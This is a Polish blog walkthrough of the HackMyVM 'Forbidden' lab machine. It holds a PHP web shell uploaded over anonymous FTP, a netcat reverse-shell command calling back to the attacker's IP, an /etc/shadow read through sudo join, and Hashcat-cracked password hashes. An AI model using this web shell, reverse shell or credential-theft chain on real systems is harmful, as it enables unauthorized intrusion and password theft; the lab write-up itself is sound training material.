---
title: "Forbidden - sML"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - Forbidden
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Forbidden - sml
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|Forbidden|
|Autor:|[sML](https://hackmyvm.eu/profile/?user=sml)|
|Wypuszczony:|2020-10-09|
|Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Forbidden)|
|Poziom:|Średni|
|System:|Linux|
|Nauczysz się:|Reverse Engineering, sprytu|

# 01. Wstęp
**Forbidden** dosyć długo leżał u mnie na dysku, zapomniałem o niej. Dopiero wróciłem w roku 2024, ale dzięki temu wyszła jedna ciekawostka (zaplanowana lub nie). Maszynka jest dosyć prosta, mimo że ma status middle, jednak ma dużo króliczych nor i chyba dzięki temu jest bardzo ciekawa, mimo swojego wieku. 
{: .text-justify}
# 02. Co to za maszyna?
Po wstępnym wykryciu ip **Netdiscoverem**
{: .text-justify}
```bash
netdiscover -P -r 172.16.1.0 | grep "PCS Systemtechnik GmbH"
```
```bash
# 172.16.1.161    08:00:27:3c:42:d7      1      60  PCS Systemtechnik GmbH
```
i skanowaniu **Nmapem**:
{: .text-justify}
```bash
db_nmap -A -p- 172.16.1.161
```
```bash
# host          port  proto  name  state  info
# ----          ----  -----  ----  -----  ----
# 172.16.1.161  21    tcp    ftp   open   vsftpd 3.0.3
# 172.16.1.161  80    tcp    http  open   nginx 1.14.2
```
widzimy, że mamy otwarte porty: 
{: .text-justify}
- **21/tcp** - FTP
- **80/tcp** - Apache WWW
Wchodząc na strone:
{: .text-justify}
![01](/assets/images/hacking/2024/01/01.png)
dostajemy dużo informacji, między innymi, że Marta jest najlepszym adminem na świecie (zobaczymy). Jest zadowolona, że nikt się jej nie włamie, bo _PHP_ wyłączyła (zobaczymy znowu).
{: .text-justify}
# 03. Co jest w środku?
## WWW
Najpierw przeskanujmy ten system programem **Forexbuster**:
{: .text-justify}
```bash
feroxbuster -x txt,php -u http://172.16.1.161
```
```bash
#  ___  ___  __   __     __      __         __   ___
# |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
# |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
# by Ben "epi" Risher 🤓                 ver: 2.10.1
# ───────────────────────────┬──────────────────────
#  🎯  Target Url            │ http://172.16.1.161
#  🚀  Threads               │ 50
#  📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
#  👌  Status Codes          │ All Status Codes!
#  💥  Timeout (secs)        │ 7
#  🦡  User-Agent            │ feroxbuster/2.10.1
#  💉  Config File           │ /etc/feroxbuster/ferox-config.toml
#  🔎  Extract Links         │ true
#  💲  Extensions            │ [txt, php]
#  🏁  HTTP methods          │ [GET]
#  🔃  Recursion Depth       │ 4
# ───────────────────────────┴──────────────────────
#  🏁  Press [ENTER] to use the Scan Management Menu™
# ──────────────────────────────────────────────────
# 404      GET        7l       12w      169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
# 200      GET        8l       41w      241c http://172.16.1.161/
# 200      GET        1l        1w       10c http://172.16.1.161/robots.txt
# 200      GET        1l       12w       75c http://172.16.1.161/note.txt
# [####################] - 33s    90000/90000   0s      found:3       errors:0      
# [####################] - 33s    90000/90000   2744/s  http://172.16.1.161/          
```
Znalezione zostały pliki: _robots.txt_ i _note.txt_. W _note.txt_ jest taka informacja ```The extra-secured .jpg file contains my password but nobody can obtain it.```. To się przyda później.
{: .text-justify}
## FTP
Mamy dostęp do FTP-a za pomocą konta **anonymous**, do tego się okazuję, że możemy też wgrywać tam pliki. Pliki o rozszerzeniu _.php_ można tam wrzucić, ale niestety się nie uruchomią wchodząc przez stronę. Za to nasza najlepsza adminka na świecie chyba zapomniała, że są inne rozszerzenia typu _.php5_. Wrzućmy tam nasz shell, którego zawartość tak wygląda:
{: .text-justify}
```php
<?php
echo shell_exec($_REQUEST['cmd']);
?>
```
Na **FTP** zaś możemy zrobić coś takiego, po prostu wrzucić ten plik.
{: .text-justify}
```bash
ftp 172.16.1.161
```
```bash
# Connected to 172.16.1.161.
# 220 (vsFTPd 3.0.3)
# Name (172.16.1.161:szikers): anonymous
# 331 Please specify the password.
Password: 
# 230 Login successful.
# Remote system type is UNIX.
# Using binary mode to transfer files.
ftp> put shell.php5
# 229 Entering Extended Passive Mode (|||23644|)
# 150 Here comes the directory listing.
# drwxrwxrwx    2 0        0            4096 Jan 05 20:53 www
# 226 Directory send OK.
ftp> cd www
# 250 Directory successfully changed.
ftp> put shell.php5
```
# 04. Reverse Shell
Odpalamy nasz Reverse Shell:
{: .text-justify}
## Nasłuchiwacz
```bash
nc -lvp 12345
```
## Kod na stronie
Wklejamy przez przeglądarkę:
{: .text-justify}
```
172.16.1.161/shell.php5?cmd=php%20-r%20%22system%20%28%27nc%20-c%20%2Fbin%2Fbash%20172.16.1.89%2012345%27%29%3B%22%20
```
# 05. Konta użytkowników
## www
w katalogu ```/var/www/html``` mamy obrazek **TOPSECRETIMAGE.jpg**. Można go rozpakować, wydobyć z niego hasło, itd... jednak na nic się to nie przyda, bo hasłem do konta marta jest **Nazwa obrazka** :smiley:
{: .text-justify}
## marta
```bash
su - marta
```
Będąc na koncie _marta_ wydajemy komendę _sudo -l_. Wynikiem zaś jest:
{: .text-justify}
```bash
marta@forbidden:~$ sudo -l
# Matching Defaults entries for marta on forbidden:
#    env_reset, mail_badpass,
#    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

# User marta may run the following commands on forbidden:
#    (ALL : ALL) NOPASSWD: /usr/bin/join
```
Niestety polecenie _sudo /usr/bin/join_ nie daje nam dostępu do konta **Roota**, jednak umożliwia przeczytanie pliku _/etc/shadow_. W nim zaś są zawarte hasła.
```bash
sudo  /usr/bin/join -a2 /dev/null /etc/shadow
```
## root
Poszliśmy na skróty, Nie wiem jak było w 2020 roku, ale teraz **Hashcat** ze słownika _rockyou.txt_ odszyfrował nam hasło użytkownika _peter_ i dodatkowo _root_ (to była ta ciekawostka). Nie musimy już przechodzić przez konto _peter_.
{: .text-justify}
```powershell
PS C:\temp\hashcat> .\hashcat.exe -O -a0 -m1800 .\hashe\forbidden.txt .\dict\rockyou.txt --show
$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:lalu******
$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:bo******
```